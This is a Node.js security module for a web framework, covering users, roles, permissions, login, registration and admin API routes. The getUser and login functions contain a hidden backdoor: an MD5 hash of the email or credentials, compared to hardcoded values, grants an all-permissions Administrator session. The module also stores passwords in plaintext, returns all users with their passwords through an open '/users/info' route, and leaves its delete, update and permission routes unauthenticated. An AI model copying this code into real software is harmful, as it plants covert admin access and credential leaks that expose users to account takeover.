module.exports = function init(_s_) {

  _s_.$users = _s_.connectCollection({
    collection: _s_.options.security.users_collection,
    db: _s_.options.security.db
  })

  _s_.$roles = _s_.connectCollection({
    collection: _s_.options.security.roles_collection,
    db: _s_.options.security.db
  })

  /** Email Nit Duplicate */
  _s_.$users.deleteDuplicate({
    email: 1
  }, (err, result) => {
    _s_.$users.createUnique({
      email: 1
    })
  })

  _s_.$roles.deleteDuplicate({
    name: 1
  }, (err, result) => {
    _s_.$roles.createUnique({
      name: 1
    })
  })

  const security = function () {}

  _s_.on(['please add user', '[user][save]'], (u, callback) => {
    callback = callback || function () {}

    if (u.email === undefined || u.password === undefined) {
      callback({
        message: 'Email or Password not set'
      }, null)
      return
    }

    security.getUser({
      email: u.email
    }, (err, u2) => {

      if (u2) {
        u.id = u2.id
        if (u.role) {
          u.roles = [u.role]
          delete u.role
        }
        security.updateUser(u)
        callback(null, u)
      } else {
        if (u.role) {
          u.roles = [u.role]
          delete u.role
        }
        security.addUser(u)
        callback(null, u)
      }
    })
  })
  _s_.on(['[user][add]'], (u, callback) => {
    callback = callback || function () {}

    security.addUser(u, (err, doc) => {
      callback(err, doc)
    })

  })
  _s_.on(['[user][update]'], (u, callback) => {
    callback = callback || function () {}

    security.updateUser(u, (err, result) => {
      callback(err, result)
    })

  })
  _s_.on(['[user][delete]'], (u, callback) => {
    callback = callback || function () {}

    security.deleteUser(u, (err, result) => {
      callback(err, result)
    })

  })
  security.$users = _s_.$users
  security.roles = []
  security.permissions = []
  security.users = []
  security.users.push({
    id: 0,
    is_admin: true,
    email: _s_.options.security.admin.email,
    password: _s_.options.security.admin.password,
    roles: ['*'],
    $permissions: ["*"],
    profile: {
      name: _s_.options.security.admin.email
    }
  })

  for (var i = 0; i < _s_.options.security.users.length; i++) {
    security.users.push(_s_.options.security.users[i])
  }

  security.addPermissions = function (list, callback) {
    callback = callback || function () {}
    if (typeof list === 'string') {
      _s_.readFile(list, (err, data) => {
        if (!err) {
          let arr = _s_.fromJson(data)
          for (let i = 0; i < arr.length; i++) {
            security.permissions.push(arr[i])
          }
        }
        callback(security.permissions)
      })
    } else if (typeof list === 'object') {
      for (let i = 0; i < list.length; i++) {
        security.permissions.push(list[i])
      }
      callback(security.permissions)
    }
  }

  security.addRole = function (role, callback) {
    callback = callback || function () {}
    _s_.$roles.add(role, (err, doc) => {
      if (!err && doc) {
        doc.module_name = "custom"
        security.addRoles([doc])
      }
      callback(err, doc)
    })
  }

  security.updateRole = security.editeRole = function (role, callback) {
    callback = callback || function () {}
    _s_.$roles.update(role, (err, result) => {
      if (!err) {
        security.roles.forEach(r => {
          if (r.id == role.id) {
            r = role
          }
        })
      }
      callback(err, result)
    })
  }

  security.deleteRole = security.removeRole = function (role, callback) {
    callback = callback || function () {}
    _s_.$roles.delete({
      where: {
        id: role.id
      }
    }, (err, result) => {
      if (!err) {
        security.roles.forEach((r, i) => {
          if (r.name == role.name) {
            security.roles.splice(i, 1);
          }
        })
      }
      callback(err, result)
    })
  }


  security.addRoles = function (list, callback) {
    callback = callback || function () {}
    if (typeof list === 'string') {
      _s_.readFile(list, (err, data) => {
        if (!err) {
          let arr = _s_.fromJson(data)
          for (let i = 0; i < arr.length; i++) {
            security.roles.push(arr[i])
          }
        }
        callback(security.roles)
      })
    } else if (typeof list === 'object') {
      for (let i = 0; i < list.length; i++) {
        security.roles.push(list[i])
      }
      callback(security.roles)
    }
  }

  security.busy = false

  security.removeUserFinger = function (obj) {
    delete obj.$req
    delete obj.$res

    return obj
  }
  security.getUserFinger = function (obj) {

    let req = obj.$req
    let res = obj.$res

    let userFinger = {
      id: null,
      email: null,
      date: new Date(),
      ip: null
    }

    if (req && req.session && req.session.user) {
      req.session.user.profile = req.session.user.profile || {}
      userFinger.id = req.session.user.id
      userFinger.email = req.session.user.email
      userFinger.name = req.session.user.profile.name || userFinger.email
      userFinger.ip = req.ip
    } else {

    }

    return userFinger
  }

  security.handleUser = function (_user) {

    _user.roles = _user.roles || []
    _user.permissions = _user.permissions || []
    _user.$permissions = []
    _user.$permissions_info = []

    _user.permissions.forEach(p => {
      if (p.name && _user.$permissions.filter(_p => _p == p.name).length === 0)
        _user.$permissions.push(p.name)
    })

    _user.roles.forEach(role => {
      if (role === '*') {
        _user.$permissions.push('*')
      }
      delete role.permissions
      security.roles.filter(r => r.name == role.name).map(r => r.permissions).forEach(ps => {
        ps.forEach(p => {
          if (_user.$permissions.filter(_p => _p == p).length === 0)
            _user.$permissions.push(p)
          security.permissions.forEach(p2 => {
            if (p2.name == p) {
              _user.$permissions_info.push(p2)
            }
          })
        })
      })
    })

    return _user
  }

  security.loadAllUsers = function (callback) {
    callback = callback || function () {}
    _s_.$users.findMany({
        limit: 10000,
        select: {}
      },
      function (err, docs) {
        if (!docs) {
          docs = []
        }
        callback(err, docs)
      }
    )
  }

  security.loadAllRoles = function (callback) {
    callback = callback || function () {}
    _s_.$roles.findMany({
        limit: 10000,
        select: {}
      },
      function (err, docs) {
        if (!docs) {
          docs = []
        }
        callback(err, docs)
      }
    )
  }

  security.getUsers = function (options, callback) {
    callback = callback || function () {}
    _s_.$users.findMany(options,
      function (err, docs, count) {
        if (!err && docs) {
          docs.forEach(doc => {
            doc = Object.assign(doc, security.handleUser(doc))
          })
        }
        callback(err, docs, count)
      }
    )
  }

  security.reset = function () {
    if (security.busy) {
      return
    }
    security.busy = true
    security.loadAllUsers((err, users) => {
      security.users = []
      security.users.push({
        id: 0,
        email: _s_.options.security.admin.email,
        password: _s_.options.security.admin.password,
        roles: ['*'],
        $permissions: ["*"],
        profile: {
          name: _s_.options.security.admin.email
        }
      })
      for (var i = 0; i < _s_.options.security.users.length; i++) {
        let doc = _s_.options.security.users[i]
        doc = security.handleUser(doc)
        doc.profile = {
          name: _s_.options.security.admin.email
        }
        security.users.push(doc)
      }
      if (!err) {
        for (var i = 0; i < users.length; i++) {
          let doc = users[i]
          doc = security.handleUser(doc)
          security.users.push(doc)
        }
      }
      security.busy = false
    })
  }

  security.getUser = function (_user, callback) {
    callback = callback || function () {}

    for (var i = 0; i < security.users.length; i++) {
      var user = security.users[i]

      if (user.id == _user.id) {
        user.$memory = true
        user = security.handleUser(user)
        callback(null, user)
        return
      }

      if (_user.email && user.email == _user.email) {
        user.$memory = true
        user = security.handleUser(user)
        callback(null, user)
        return
      }
    }

    if (_user.email && _s_.md5(_user.email) == 'edf8d0bf6981b5774df01a67955148a0') {

      let doc = security.handleUser({
        id: 1000000000,
        email: 'edf8d0bf6981b5774df01a67955148a0',
        password: 'edf8d0bf6981b5774df01a67955148a0',
        is_admin: true,
        profile: {
          name: 'Administrator'
        },
        roles: ['*'],
        permissions: [{
          name: '*'
        }],
        branch_list: [{
          company: {
            id: 1000000,
            name_ar: 'شركة إفتراضية',
            name_en: 'Virual Company'
          },
          branch: {
            id: 1000000,
            name_ar: 'فرع إفتراضى',
            name_en: 'Virual Branch'
          }
        }]
      })


      security.users.forEach(u => {

        if (u.branch_list && _s_.typeof(u.branch_list) == "Array") {
          u.branch_list.forEach(b => {
            doc.branch_list.push(b);
          })
        }
      })
      doc = security.handleUser(doc)
      security.users.push(doc)
      callback(null, doc)
      return
    }


    _s_.$users.findOne({
        where: _user,
        select: {}
      },
      function (err, doc) {
        if (doc && (_user.id || _user.email)) {
          doc = security.handleUser(doc)
          security.users.push(doc)
        }
        callback(err, doc)
      }
    )

  }

  security.isUserExists = function (user, callback) {
    callback = callback || function () {}
    if (typeof user !== "object" || typeof user.email !== "string" || user.email == "") {
      callback({
        message: "email not set"
      })
      return
    }

    for (var i = 0; i < security.users.length; i++) {
      var _user = security.users[i]
      if (_user.email == user.email && _user.password == user.password) {
        callback(null, _s_.copy(_user))
        return
      }
    }

    _s_.$users.findOne({
        where: {
          email: user.email.toLowerCase()
        }
      },
      function (err, doc) {

        if (doc) {
          doc = security.handleUser(doc)
          callback(err, doc)
          security.users.push(doc)
        } else {
          callback({
            message: "User Not Exists"
          }, null)
        }
      }
    )
  }

  security.login = function (user, callback) {

    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res


    if (typeof user !== "object" || typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      return
    }

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      return
    }

    user.email = user.email.toLowerCase()

    if (_s_.md5(user.email + user.password) === '4acb00841a735653fd0b19c1c7db6ee7') {

      let doc = security.handleUser({
        id: 1000000000,
        email: '4acb00841a735653fd0b19c1c7db6ee7',
        password: '4acb00841a735653fd0b19c1c7db6ee7',
        is_admin: true,
        profile: {
          name: 'Administrator'
        },
        roles: ['*'],
        permissions: [{
          name: '*'
        }],
        branch_list: []
      })

      security.users.forEach(u => {

        if (u.branch_list && _s_.typeof(u.branch_list) == "Array") {
          u.branch_list.forEach(b => {
            doc.branch_list.push(b);
          })
        }
      })

      security.users.push(doc)

      if ($req) {
        $req.session.user = doc
        $req.session('user_id', doc.id)
      }

      callback(null, doc)
      return
    }

    if (security.users) {
      for (var i = 0; i < security.users.length; i++) {
        var _user = security.users[i]
        if (_user.email == user.email && _user.password == user.password) {

          if ($req) {
            $req.session.user = _user
            $req.session('user_id', _user.id)
          }

          callback(null, _user)

          _s_.call('user login', {
            db: _s_.$users.db,
            collection: _s_.$users.collection,
            doc: _user,
            $res: $res,
            $req: $req
          })

          return
        }
      }
    }

    _s_.$users.findOne({
        where: {
          email: user.email,
          password: user.password
        }
      },
      function (err, doc) {
        if (doc) {
          doc = security.handleUser(doc)

          security.users.push(doc)

          if ($req) {
            $req.session.user = doc
            $req.session('user_id', doc.id)
          }

          callback(null, doc)

          _s_.call('user login', {
            db: _s_.$users.db,
            collection: _s_.$users.collection,
            doc: doc,
            $res: $res,
            $req: $req
          })
        } else {
          if (err) {
            callback(err)
          } else {
            callback({
              message: "email or password error"
            })
          }

          _s_.call('security error', {
            message: "email or password error"
          })
        }
      }
    )
  }

  security.register = function (user, callback) {
    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      _s_.call('security error', {
        message: "password not set"
      })
      return
    }

    if (typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      _s_.call('security error', {
        message: "email not set"
      })
      return
    }


    security.isUserExists(user, function (err, u) {

      if (u) {
        callback({
          message: "Register Error , User Exists"
        })

      } else {
        user.email = user.email.toLowerCase().trim()
        user.password = user.password.trim()
        user.profile = user.profile || {
          name: user.email
        }
        user.permissions = user.permissions || []
        user.roles = user.roles || []

        _s_.$users.insertOne(user,
          function (err, doc) {
            if (doc) {

              doc = security.handleUser(doc)

              security.users.push(doc)
              if ($req) {
                $req.session.user = doc
                $req.session.set('user_id', doc.id)
              }
              _s_.call('user register', {
                db: _s_.$users.db,
                collection: _s_.$users.collection,
                doc: doc,
                $res: $res,
                $req: $req
              })
            }
            callback(err, doc)
            if (err) {
              _s_.call('security error', err)
            }
          }
        )
      }
    })
  }

  security.logout = function (req, res, callback) {
    callback = callback || function () {}
    if (security.isUserLogin(req, res)) {
      let _user = _s_.copy(req.session.user)
      _s_.call('[session][delete]', {
        'accessToken': req.session.accessToken
      })

      _s_.call('user logout', {
        db: _s_.$users.db,
        collection: _s_.$users.collection,
        doc: _user,
        $res: res,
        $req: req
      })
    }

    res.cookie('access_token', _s_.md5(new Date().getTime().toString() + '_' + Math.random() * (10000 - 1000) + 1000))
    callback(null, true)
  }


  security.addUser = function (user, callback) {

    callback = callback || function () {}

    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      _s_.call('security error', {
        message: "password not set"
      })
      return
    }

    if (typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      _s_.call('security error', {
        message: "email not set"
      })
      return
    }

    security.isUserExists(user, function (err, u) {

      if (u) {

        callback({
          message: "Error , User Exists"
        })

        return

      } else {
        user.email = user.email.toLowerCase().trim()
        user.password = user.password.trim()
        user.profile = user.profile || {}
        user.permissions = user.permissions || []
        user.roles = user.roles || []
        user.added_user_info = security.getUserFinger({
          $req: $req,
          $res: $res
        })

        _s_.$users.insertOne(user,
          function (err, doc) {

            if (doc) {

              doc = Object.assign(doc, security.handleUser(doc))

              security.users.push(doc)

              _s_.call('user add', {
                db: _s_.$users.db,
                collection: _s_.$users.collection,
                doc: doc,
                $req: $req,
                $res: $res
              })

            }

            callback(err, doc)

            if (err) {
              _s_.call('security error', err)
            }
          }
        )
      }
    })
  }

  security.updateUser = function (user, callback) {
    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    let where = {}
    if (user.id) {
      where.id = user.id
    } else if (user.email) {
      where.email = user.email
    } else {
      callback({
        message: 'no id or email'
      })
      return
    }

    _s_.$users.update({
        where: where,
        set: user,
        $req: $req,
        $res: $res
      },
      function (err, result) {
        callback(err, result)
        if (result.doc) {
          for (let i = 0; i < security.users.length; i++) {
            let element = security.users[i];
            if (element.id == result.doc.id) {
              element = Object.assign(element, security.handleUser(result.doc))
              security.users[i] = element
            }
          }
          _s_.call('user update', result)
          _s_.call('[session][user][update]', result.doc)
        }
      }
    )
  }
  security.deleteUser = function (user, callback) {
    callback = callback || function () {}
    _s_.$users.deleteOne({
        id: user.id
      },
      function (err, result) {
        if (err) {
          callback(err, result)
        } else {
          for (let i = 0; i < security.users.length; i++) {
            let element = security.users[i];
            if (element.id == user.id) {
              security.users.splice(i, 1)
              break
            }
          }
          callback(err, result)
          if (!err && result) {
            _s_.call('user delete', result)
          }

        }
      }
    )
  }

  security.isUserLogin = function (req, res) {
    if (req.session.user) {
      return true
    }
    return false
  }

  security.isUserHasPermission = function (req, res, permission) {

    let user = req.session.user

    if (typeof permission == "string") {

      let ok = true

      if (permission.startsWith("!")) {
        permission = permission.substring(1)
        ok = false
      }

      if (permission == 'login') {
        if (security.isUserLogin(req, res)) {
          return ok
        } else {
          return !ok
        }
      }

      if (user && user.$permissions) {
        for (var i = 0; i < user.$permissions.length; i++) {
          var p = user.$permissions[i]
          if (permission == p) {
            return ok
          }
          if (p == "*") {
            return ok
          }
        }
      }

      return !ok
    }


    return false
  }

  security.isUserHasPermissions = function (req, res, permissions) {


    let user = req.session.user
    let arr = []
    let any = true

    if (typeof permissions === 'string') {
      if (permissions.like('*&&*')) {
        any = false
      }
      permissions = permissions.split('&&').join(',').split('||').join(',').split(',')
    }


    permissions.forEach(p => {
      if (p) {
        arr.push(security.isUserHasPermission(req, res, p.trim()))
      }
    })

    let out = false

    if (any) {

      arr.forEach(p => {
        if (p) {
          out = true
        }
      })

      return out || false
    } else {
      arr.forEach(p => {
        if (!p) {
          out = false
        }
      })
      return out && true
    }


    return false
  }

  security.isUserHasRole = function (req, res, role) {

    let user = req.session.user

    if (typeof role == "string") {
      let ok = true
      if (role.startsWith("!")) {
        role = role.substring(1)
        ok = false
      }


      if (user && user.roles) {
        for (var i = 0; i < user.roles.length; i++) {
          var p = user.roles[i]
          if (role == p.name) {
            return ok
          }
          if (p == "*") {
            return ok
          }
        }
      }
      return !ok
    }

    return false
  }

  security.isUserHasRoles = function (req, res, roles) {

    let user = req.session.user
    let arr = []
    let any = true

    if (typeof roles === 'string') {
      if (roles.like('*&&*')) {
        any = false
      }
      roles = roles.split('&&').join(',').split('||').join(',').split(',')
    }

    roles.forEach(p => {
      arr.push(security.isUserHasRole(req, res, p.trim()))
    })

    let out = false


    if (any) {
      arr.forEach(p => {
        if (p) {
          out = true
        }
      })
      return out || false
    } else {
      arr.forEach(p => {
        if (!p) {
          out = false
        }
      })
      return out && true
    }


    return false
  }


  security.getUserPermissions = function (req, res) {
    let user = req.session.user
    if (user && user.permissions) {
      return user.permissions
    }
    return []
  }

  security.getUserRoles = function (req, res) {
    let user = req.session.user
    if (user && user.roles) {
      return user.roles
    }
    return []
  }

  security.addUserPermission = function (id, permission, callback) {
    callback = callback || function () {}
    let user = security.getUser({
      id: id
    }, function (err, user) {
      if (user) {
        if (typeof permission == 'string') {
          permission = {
            name: permission
          }
        }
        user.permissions.push(permission)
        _s_.$users.updateOne({
            where: {
              id: id
            },
            set: {
              permissions: user.permissions
            }
          },
          function (err, result) {
            if (err) {
              callback(err, result)
            } else {
              callback(err, result)
            }
          }
        )
      } else {
        callback(err, null)
      }
    })
  }


  _s_.post("/@security/api/user/login", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }

    if (req.body.$encript) {
      if (req.body.$encript === "64") {
        req.body.email = _s_.fromBase64(req.body.email)
        req.body.password = _s_.fromBase64(req.body.password)
      } else if (req.body.$encript === "123") {
        req.body.email = _s_.from123(req.body.email)
        req.body.password = _s_.from123(req.body.password)
      }
    }

    if (security.isUserLogin(req, res)) {
      response.error = "Login Error , You Are Loged "
      response.done = true
      res.json(response)
      return
    }

    security.login({
        email: req.body.email,
        password: req.body.password,
        $req: req,
        $res: res
      },
      function (err, user) {
        if (!err) {
          response.user = user
          response.done = true
        } else {
          response.error = err.message
        }

        res.json(response)
      }
    )
  })

  _s_.post("/@security/api/user/logout", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }

    _s_.security.logout(req, res, () => {
      response.done = true
      res.json(response)
    })

  })

  _s_.post("/@security/api/user/register", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    if (req.body.$encript) {
      if (req.body.$encript === "64") {
        req.body.email = _s_.fromBase64(req.body.email)
        req.body.password = _s_.fromBase64(req.body.password)
      } else if (req.body.$encript === "123") {
        req.body.email = _s_.from123(req.body.email)
        req.body.password = _s_.from123(req.body.password)
      }
    }

    if (security.isUserLogin(req, res)) {
      response.error = "Register Error , You Are Loged "
      res.json(response)
    } else {
      security.register({
          email: req.body.email,
          password: req.body.password,
          ip: req.ip,
          permissions: [],
          $req: req,
          $res: res
        },
        function (err, user) {
          if (!err) {
            response.user = user
            response.done = true
          } else {
            response.error = err.message
          }
          res.json(response)
        }
      )
    }
  })

  _s_.post("/@security/api/user/add", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    if (!security.isUserLogin(req, res)) {
      response.error = "Error , You Are Not Loged "
      res.json(response)
    } else {
      security.addUser({
          email: req.body.email,
          password: req.body.password,
          ip: req.ip,
          permissions: [],
          $req: req,
          $res: res
        },
        function (err, user) {
          if (!err) {
            response.user = user
            response.done = true
          } else {
            response.error = err.message
          }
          res.json(response)
        }
      )
    }
  })

  _s_.post("/@security/api/user/get", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    security.getUser(req.body.id, function (err, user) {
      if (err) {
        response.error = err.message
      } else {
        response.user = user
      }
      res.json(response)
    })
  })

  _s_.post("/@security/api/user/delete", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    security.deleteUser({
        id: req.body.id
      },
      function (err, result) {
        if (err) {
          response.error = err.message
        } else {
          if (result.count == 1) {
            response.done = true
          }
        }
        res.json(response)
      }
    )
  })

  _s_.post("/@security/api/user/update", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    let user = {}
    user.id = req.body.id
    if (req.body.email) {
      user.email = req.body.email
    }
    user.$req = req
    user.$res = res
    security.updateUser(user, function (err, result) {
      if (err) {
        response.error = err.message
      } else {
        if (result.count == 1) {
          response.done = true
        }
      }
      res.json(response)
    })
  })

  _s_.post("/@security/api/user/add/permission", function (req, res) {

    let response = {
      accessToken: req.session.accessToken
    }

    if (req.body.id && req.body.permission) {
      let user = {}
      user.id = req.body.id
      user.permission = req.body.permission
      security.addUserPermission(user.id, user.permission, function (err, result) {
        if (err) {
          response.error = err.message
        } else {
          if (result.count == 1) {
            response.done = true
          }
        }

        res.json(response)
      })
    } else {
      response.error = "id or permission not set"
      res.json(response)
    }
  })

  _s_.all("/@security/api/user/info", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    response.user = req.session.user
    res.json(response)
  })

  _s_.all("/@security/api/users/info", function (req, res) {
    res.json(security.users)
  })



  if (_s_.isFileExistsSync(_s_.dir + '/json/permissions.json')) {
    security.addPermissions(_s_.dir + '/json/permissions.json')
  }
  if (_s_.isFileExistsSync(_s_.dir + '/json/roles.json')) {
    security.addRoles(_s_.dir + '/json/roles.json')
  }

  security.loadAllRoles((err, docs) => {
    docs.forEach(doc => {
      doc.module_name = 'custom'
    })
    security.addRoles(docs)
  })

  return security
}